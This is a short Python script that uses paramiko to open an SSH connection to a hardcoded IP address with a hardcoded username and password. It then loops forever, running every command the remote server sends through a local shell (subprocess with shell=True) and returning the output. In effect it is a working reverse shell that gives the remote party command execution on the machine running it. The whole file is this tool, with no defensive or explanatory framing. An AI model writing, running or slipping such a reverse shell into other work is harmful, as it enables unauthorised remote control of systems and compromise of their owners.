# coding:utf-8

import threading, paramiko, subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd,look_for_keys=False)
    print(2)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print(command)
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode('shift_jis'))
        
        while True:
            command = ssh_session.recv(1024).decode('shift_jis')
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
                
        client.close()                
    return

ssh_command('192.0.0.0', b'justin', b'lovesthepyhon', b'ClientConnected')